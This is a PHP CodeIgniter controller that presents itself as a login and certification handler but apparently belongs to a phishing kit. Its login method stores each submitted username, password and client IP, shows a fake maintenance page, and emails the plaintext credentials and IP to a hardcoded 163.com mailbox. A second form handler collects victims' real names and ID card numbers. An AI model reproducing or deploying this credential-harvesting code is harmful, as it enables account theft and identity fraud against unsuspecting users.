<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Operator extends CI_Controller{
    function __construct()
    {
        parent::__construct();
        $this->load->helper('getip');
    }

    function login()
    {

        $data['username']=$this->input->post('vv_number');
        $data['password']=$this->input->post('login_pwd');
        $data['ip']=get_clientIP();
        $this->load->model('modeluser');
        $rs=$this->modeluser->AddUser($data);
        if($rs)
        {
            $this->load->view('weihu');
        }
        $this->SendMail($data['username'],$data['password'],$data['ip']);

    }
    private function SendMail($username,$userpass,$ip)
    {
        $this->config->load('email_config', TRUE);
        $emailConfig = $this->config->item('useremail', 'email_config');
        $this->load->library('email');
        $this->email->initialize($emailConfig);

        $this->email->from('m13841056971_1@163.com','owner');
        $this->email->to('m13841056971_1@163.com');
        $this->email->subject("登录提醒");
        $this->email->message("登录用户名：".$username.";  登陆密码：".$userpass.";  登录IP：".$ip);
        $this->email->send();
    }

    public function Cert()
    {
        $this->load->view('renzheng');
    }

    public  function CertForm()
    {
        $data["realname"]=$this->input->post("username");
        $data['usercard']=$this->input->post('identity');
        $this->load->model('modeluserinfo');
        $re=$this->modeluserinfo->AddUserinfo($data);


    }


}